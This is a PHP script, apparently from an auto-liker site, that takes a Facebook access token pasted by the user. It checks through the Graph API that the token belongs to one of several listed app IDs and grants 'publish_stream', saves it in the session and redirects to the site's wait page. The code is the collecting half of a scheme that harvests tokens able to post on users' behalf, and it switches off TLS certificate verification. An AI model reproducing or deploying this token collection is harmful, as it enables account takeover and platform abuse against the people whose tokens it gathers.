<?php
function get_json($url) {
$ch = curl_init();

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FAILONERROR, 0);
$data = curl_exec($ch);
curl_close($ch);
return json_decode($data);
}
function get_html($url) {
$ch = curl_init();

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FAILONERROR, 0);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}
$token2 = $_GET["user"];
session_start();
if(isset($token2)){
if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
$token = $matches[1];
}else{
$token = $token2;}
$exe = json_decode(get_html("https://graph.fb.me/app?access_token=".$token ))->id;
$extend = get_html("https://graph.fb.me/me/permissions?access_token="  . $token);

if($exe == "200758583311692" || $exe == "124707800885763" || $exe == "41158896424" || $exe == "2254487659"){
$pos = strpos($extend, "publish_stream");
if ($pos == true) {
$_SESSION['token'] = $token;
header('Location: http://www.darkliker.com/wait.php');
}
else {
header('Location: http://www.darkliker.com/index.php?i=Hey Please Generate Valid Token From Our Site');}
}else{
header('Location: http://www.darkliker.com/index.php?i=Hey Please Generate Valid Token From Our Site');}
}else{
header('Location: http://www.darkliker.com/index.php?i=Hey Please Generate Valid Token From Our Site');}
?>